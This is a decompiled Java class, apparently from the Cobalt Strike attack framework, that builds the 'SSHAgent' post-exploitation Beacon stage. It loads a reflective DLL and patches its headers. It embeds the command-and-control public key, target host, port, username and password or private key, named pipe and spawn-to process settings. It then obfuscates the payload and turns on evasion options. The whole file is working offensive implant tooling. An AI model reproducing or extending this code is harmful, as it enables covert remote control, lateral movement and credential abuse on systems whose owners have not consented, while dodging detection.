package beacon.setup;

import beacon.BeaconPayload;
import beacon.BeaconSetup;
import beacon.Settings;
import c2profile.Profile;
import common.CommonUtils;
import common.ReflectiveDLL;
import common.SleevedResource;
import dns.AsymmetricCrypto;
import dns.QuickSecurity;
import pe.PostExObfuscator;

public class SSHAgent {
   protected String host;
   protected int port;
   protected String username;
   protected String password;
   protected String pipename;
   protected boolean pubkey;
   protected String statusp;
   protected BeaconSetup setup;
   protected Profile c2profile;

   public SSHAgent(BeaconSetup var1, Profile var2, String var3, int var4, String var5, String var6, String var7, boolean var8) {
      this.host = var3;
      this.port = var4;
      this.username = var5;
      this.password = var6;
      this.pipename = var7;
      this.pubkey = var8;
      this.setup = var1;
      this.c2profile = var2;
      this.statusp = CommonUtils.garbage("sshagent");
   }

   public String getStatusPipeName() {
      return "\\\\.\\pipe\\" + this.statusp;
   }

   public byte[] export(String var1) {
      byte[] var2;
      if ("x86".equals(var1)) {
         var2 = this.exportSSHStage("resources/sshagent.dll", "x86");
      } else {
         var2 = this.exportSSHStage("resources/sshagent.x64.dll", "x64");
      }

      var2 = CommonUtils.strrep(var2, "\\\\.\\pipe\\sshagent", this.getStatusPipeName());
      if (this.c2profile.option(".post-ex.smartinject")) {
         var2 = PostExObfuscator.setupSmartInject(var2);
      }

      if (this.c2profile.option(".post-ex.obfuscate")) {
         PostExObfuscator var3 = new PostExObfuscator();
         var3.process(var2);
         var3.enableEvasions();
         var2 = var3.getImage();
      }

      return var2;
   }

   protected byte[] exportSSHStage(String var1, String var2) {
      return var2.equals("x64") ? ReflectiveDLL.patchDOSHeaderX64(this.exportSSHDLL(var1)) : ReflectiveDLL.patchDOSHeader(this.exportSSHDLL(var1));
   }

   protected byte[] exportSSHDLL(String var1) {
      byte[] var2 = SleevedResource.readResource(var1);
      BeaconSetup var10000 = this.setup;
      AsymmetricCrypto var3 = BeaconSetup.beacon_asymmetric();
      Settings var4 = new Settings();
      var4.addInt(4, 1048576);
      var4.addData(7, var3.exportPublicKey(), 256);
      var4.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
      var4.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
      var4.addString(15, this.pipename, 128);
      var4.addShort(31, QuickSecurity.getCryptoScheme());
      var4.addString(21, this.host, 256);
      var4.addShort(22, this.port);
      var4.addString(23, this.username, 128);
      var4.addInt(37, this.c2profile.getInt(".watermark"));
      if (this.pubkey) {
         var4.addString(25, this.password, 6144);
      } else {
         var4.addString(24, this.password, 128);
      }

      byte[] var5 = var4.toPatch(8192);
      var5 = BeaconPayload.beacon_obfuscate(var5);
      String var6 = CommonUtils.bString(var2);
      int var7 = var6.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
      var6 = CommonUtils.replaceAt(var6, CommonUtils.bString(var5), var7);
      return CommonUtils.toBytes(var6);
   }
}
